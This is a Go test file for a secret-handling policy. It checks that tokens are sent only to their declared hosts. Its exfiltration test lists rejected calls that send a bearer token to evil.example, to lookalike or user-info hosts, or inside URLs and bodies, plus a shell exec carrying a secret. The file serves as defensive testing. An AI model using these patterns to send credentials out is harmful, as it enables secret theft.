package policy

import (
	"strings"
	"testing"
)

var testMeta = map[string]SecretMeta{
	"gh":   {Description: "GitHub", Hosts: []string{"api.github.com"}},
	"wild": {Hosts: []string{"*.example.com"}},
	"cmd":  {AllowCommands: true},
	"none": {Description: "no hosts"},
}

func call(url string, headers map[string]string, body string) Call {
	return Call{HTTP: &HTTPSpec{Method: "GET", URL: url, Headers: headers, Body: body}}
}

func TestFromCallAllowsTheDeclaredHost(t *testing.T) {
	p, err := FromCall(call("https://api.github.com/user", map[string]string{"Authorization": "Bearer {{secret:gh}}"}, ""), testMeta)
	if err != nil {
		t.Fatal(err)
	}
	a, err := p.Render(nil)
	if err != nil || a.Secrets()[0] != "gh" || !strings.Contains(a.Display(), "‹secret:gh›") {
		t.Fatalf("%v %v", a, err)
	}
	if _, err := FromCall(call("https://a.b.example.com/x", map[string]string{"X": "{{secret:wild}}"}, ""), testMeta); err != nil {
		t.Fatal(err)
	}
}

func TestFromCallBlocksExfiltration(t *testing.T) {
	auth := map[string]string{"Authorization": "Bearer {{secret:gh}}"}
	bad := map[string]Call{
		"other host":     call("https://evil.example/x", auth, ""),
		"lookalike":      call("https://api.github.com.evil.example/x", auth, ""),
		"suffix trick":   call("https://evilapi.github.com/x", auth, ""),
		"user info":      call("https://api.github.com@evil.example/x", auth, ""),
		"other port":     call("https://api.github.com:8443/x", auth, ""),
		"in url":         call("https://api.github.com/x?t={{secret:gh}}", nil, ""),
		"in body":        call("https://api.github.com/gists", nil, `{"t":"{{secret:gh}}"}`),
		"unknown":        call("https://api.github.com/x", map[string]string{"A": "{{secret:nope}}"}, ""),
		"no hosts":       call("https://api.github.com/x", map[string]string{"A": "{{secret:none}}"}, ""),
		"internal":       call("https://api.github.com/x", map[string]string{"A": "{{secret:_totp_secret}}"}, ""),
		"wildcard apex":  call("https://example.com/x", map[string]string{"X": "{{secret:wild}}"}, ""),
		"param template": call("https://api.github.com/x", map[string]string{"A": "{{x}}"}, ""),
		"no secret":      call("https://api.github.com/x", nil, ""),
		"relative":       call("/x", auth, ""),
		// A legitimate header must not carry a secret in the body along with it.
		"body with header": call("https://api.github.com/gists", auth, `{"files":{"a":{"content":"{{secret:gh}}"}}}`),
		"url with header":  call("https://api.github.com/x?k={{secret:gh}}", auth, ""),
	}
	for name, c := range bad {
		if _, err := FromCall(c, testMeta); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
}

func TestFromCallCommands(t *testing.T) {
	ok := Call{Exec: &ExecSpec{Argv: []string{"/usr/bin/git", "ls-remote", "https://example.com/r"}, Env: map[string]string{"GIT_TOKEN": "{{secret:cmd}}"}}}
	p, err := FromCall(ok, testMeta)
	if err != nil || p.Risk != RiskHigh {
		t.Fatalf("%v %v", p.Risk, err)
	}
	for name, c := range map[string]Call{
		"not allowed": {Exec: &ExecSpec{Argv: []string{"/usr/bin/git"}, Env: map[string]string{"T": "{{secret:gh}}"}}},
		"in argv":     {Exec: &ExecSpec{Argv: []string{"/usr/bin/git", "{{secret:cmd}}"}}},
		"shell":       {Exec: &ExecSpec{Argv: []string{"/bin/sh", "-c", "x"}, Env: map[string]string{"T": "{{secret:cmd}}"}}},
	} {
		if _, err := FromCall(c, testMeta); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
}

func TestSecretMetaValidate(t *testing.T) {
	for _, h := range []string{"https://a.com", "a.com/x", "*", "*.", "a b.com", "A.COM"} {
		m := SecretMeta{Hosts: []string{h}}
		if m.Validate() == nil {
			t.Errorf("host %q accepted", h)
		}
	}
	if (&SecretMeta{Description: "a‮b"}).Validate() == nil {
		t.Error("bidi accepted")
	}
	if err := (&SecretMeta{Description: "GitHub token", Hosts: []string{"api.github.com", "*.example.com", "localhost:8080"}}).Validate(); err != nil {
		t.Fatal(err)
	}
}
